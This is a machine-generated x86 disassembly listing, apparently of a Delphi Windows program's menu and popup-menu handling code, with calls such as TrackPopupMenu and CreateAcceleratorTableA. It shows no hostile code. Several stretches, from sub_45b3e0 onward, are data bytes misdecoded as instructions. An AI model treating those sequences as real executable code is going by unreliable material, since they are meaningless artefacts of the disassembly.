mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x68 ]
mov ecx sub_45a810
xchg ecx eax
call sub_456118
mov eax [ ebp - 0x8 ]
push eax
push esi
call CreateAcceleratorTableA
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax esi
call sub_402714
sub_45a8cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_4566dc
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_45a918
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_45a250
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_45a8cc
call sub_456118
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_45a974
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a99e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a9c0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45aef3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aefa
lea eax [ ebp - 0x30 ]
call sub_403fe8
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ esi + 0x4 ]
call sub_459b68
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4677a4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov dx [ esi + 0x4 ]
call sub_459b4c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45ad26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45ad09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424ba0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424a40
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45b198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ad10
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424ba0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45a3ac
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_459aac
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_459aac
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45ae69
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45ae44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45ae27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424ba0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424a40
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae2e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424ba0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_4438c8
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4677a4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_459aac
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_459aac
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_459aac
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_459adc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418550
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_459adc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_467448
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_4674b0
jmp r-xdata
sub_45ae4b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45af04
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4183f4
pop esi
pop ebx
retn
push ebx
push sub_45a974
call sub_4219b8
mov [ ebx + 0x10 ] eax
sub_45af48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4598c4
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45af04
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45afbc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45af2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_459960
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_45b014
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_455c5c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45a5cc
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45a5cc
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45b05c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_455c5c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465ff4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40346c
mov edx eax
jmp r-xdata
sub_45b0a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416eec
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45b014
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_459218
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_459714
mov eax [ ebx + 0x34 ]
call sub_456abc
mov eax ebx
call sub_45a0bc
mov eax ebx
call sub_45b05c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_456bec
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45b15c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418550
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418550
cmp ebp [ eax ]
jne r-xdata
sub_45b198
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4240e4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_423918
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_4240e4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_423918
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40346c
mov edx [ r-xdata ]
call sub_4033fc
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4240e4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_423918
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45b280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40403c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042a8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404548
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042a8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404548
jmp r-xdata
sub_45b314
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403fe8
mov ebx 0x1
mov eax esi
call sub_4042a8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4041d0
sub_45b378
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b3d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b280
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45b280
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f74
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3d8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_45b3e0
adc al [ eax ]
add [ eax ] al
push 0x5400473d
mov [ 0x3d640047 ] al
inc edi
add [ edx ] cl
inc edi
add [ eax + 0x3d ] ah
inc edi
add [ eax + 0x5c0047a1 ] bh
cmp eax 0xa1e80047
inc edi
add [ eax + 0x3d ] bl
inc edi
add al bh
movsb [ edi ] [ esi ]
inc edi
add [ ebp + edi + 0x47 ] dl
add ah dh
mov eax [ 0x3d500047 ]
inc edi
add [ eax - 0x5d ] bh
inc edi
add [ ebp + edi + 0x47 ] cl
add al ch
mov [ 0x3d480047 ] al
inc edi
add [ ebp + 0x3d440047 ] al
inc edi
add [ eax + 0x400047a5 ] al
cmp eax 0xa2a00047
inc edi
add [ edi - 0x5ac3ffb9 ] bh
inc edi
add [ eax ] bh
cmp eax 0xa5000047
inc edi
add [ edi - 0x5a23ffb9 ] dh
inc edi
add [ eax ] dh
cmp eax 0xa5a00047
inc edi
add [ edi - 0x5d4fffb9 ] ch
inc edi
add [ eax ] ch
cmp eax 0xa2c00047
inc edi
add [ edi - 0x5cfbffb9 ] ah
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45b4d8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b4df
retn
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a64
mov eax rw-data
call sub_403fe8
sub_45b4e4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45b3e0
call sub_403d94
mov eax [ r-xdata ]
call sub_417b84
mov eax [ r-xdata ]
call sub_417c24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov eax [ r-xdata ]
call sub_417ac8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429800
mov [ rw-data ] eax
sub_45b6b2
cmp al 0xe2
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jmp [ ecx + ebp * 8 ]
mov dh 0x45
add [ edi + ebx * 2 + 0x41 ] bl
add [ 0x6f460500 ] cl
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ ecx + ebp * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
jae r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
pushad
0x10045 0x0
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
and al 0xe9
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ esp + esi + 0x9300040 ] ch
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] ah
mov eax 0x77080045
jae r-xdata
outsd
insb
outsd
jb r-xdata
jmp r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_421ed8
sub [ eax ] al
add bh bh
push 0x10045e9
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x6c0045ed ] dh
fild [ eax + eax - 0x6c ]
mov [ 0xffffffff8b4c0044 ] eax
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
outsd
jb r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
inc [ ecx + 0xfffe1 ]
add [ ebx + 0x57509f9 ] al
mov eax 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
add bh bh
pushfd
jmp r-xdata
inc eax
add [ eax + eax ] cl
mov ch 0x45
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
add [ ebx + ebx * 8 + 0x44 ] ch
add [ ebx - 0x74b3ffbc ] dl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jne r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
xor al 0x5c
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
test edi edi
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_46bac0
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
cmp ch ch
inc ebp
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc edx
add ah bl
or al 0x42
jae r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b7f7
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
or al 0xeb
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + edi * 4 ] ah
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ eax + edi * 4 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov ecx 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx - 0x4651ffbb ] bh
inc ebp
add [ edx + eax ] bl
add [ eax ] al
dec esp
mov eax 0x3
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404d90
sub_45b93e
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esi + ebp * 8 ] bh
inc ebp
add ah dh
movsb [ edi ] [ esi ]
inc esp
add ah ch
in eax dx
inc ebp
add ah bl
mov eax [ 0xffffffffedfc0044 ]
inc ebp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_45b97a
inc esp
add [ esi + ebp * 8 + 0x45 ] bl
add [ ecx + esi * 8 ] cl
inc ebp
add [ eax - 0xd ] al
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc [ ebx + esi * 8 + 0x45 ]
add [ eax ] ah
hlt
sub_45bad4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add al dh
mov ebx 0xbbfe0045
inc ebp
add [ edx + eax ] ah
add [ eax ] al
push 0xdc0045b8
